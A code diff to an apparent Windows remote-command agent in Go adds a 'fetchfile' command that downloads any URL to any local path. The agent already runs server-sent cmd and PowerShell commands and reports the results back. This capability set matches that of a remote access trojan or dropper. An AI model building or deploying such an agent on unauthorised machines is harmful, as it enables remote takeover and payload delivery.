@@ -13,6 +13,8 @@ import (
     "net"
     "net/http"
     "os/exec"
+    "os"
+    "io"
     "strings"
     "sync"
     "syscall"
@@ -127,7 +129,17 @@ func executeCommandAndSendResult(cmd Command) {
     case strings.HasPrefix(cmd.Cmd, "run_script "):
            scriptPath := strings.TrimSpace(strings.TrimPrefix(cmd.Cmd, "run_script"))
            runPowerShellScript(cmd, scriptPath)
-
+    case strings.HasPrefix(cmd.Cmd, "fetchfile "):
+        parts := strings.SplitN(cmd.Cmd[len("fetchfile "):], " ", 2)
+        if len(parts) == 2 {
+            fetchRemoteFile(parts[0], parts[1], cmd.ID)
+        } else {
+            log.Println("Fetchfile command format error. Expected 'fetchfile <url> <destination_path>'.")
+            sendResult(CommandResult{
+                ID:     cmd.ID,
+                Result: "Usage: fetchfile <url> <destination_path>",
+            })
+        }
     default:
         executeOtherCommand(cmd)
     }
@@ -331,6 +343,49 @@ func execPowerShellAndSendResult(cmd Command) {
     })
 }
 
+func fetchRemoteFile(url, destPath string, commandID string) {
+    resp, err := http.Get(url)
+    if err != nil {
+        sendResult(CommandResult{
+            ID:     commandID,
+            Result: fmt.Sprintf("❌ Failed to fetch %s: %v", url, err),
+        })
+        return
+    }
+    defer resp.Body.Close()
+
+    if resp.StatusCode != http.StatusOK {
+        sendResult(CommandResult{
+            ID:     commandID,
+            Result: fmt.Sprintf("❌ Server returned: %s", resp.Status),
+        })
+        return
+    }
+
+    file, err := os.Create(destPath)
+    if err != nil {
+        sendResult(CommandResult{
+            ID:     commandID,
+            Result: fmt.Sprintf("❌ Failed to create %s: %v", destPath, err),
+        })
+        return
+    }
+    defer file.Close()
+
+    _, err = io.Copy(file, resp.Body)
+    if err != nil {
+        sendResult(CommandResult{
+            ID:     commandID,
+            Result: fmt.Sprintf("❌ Failed to save file: %v", err),
+        })
+        return
+    }
+
+    sendResult(CommandResult{
+        ID:     commandID,
+        Result: fmt.Sprintf("✅ File successfully fetched to %s", destPath),
+    })
+}
 
 func executeOtherCommand(cmd Command) {
     output, err := exec.Command("cmd", "/C", cmd.Cmd).CombinedOutput()
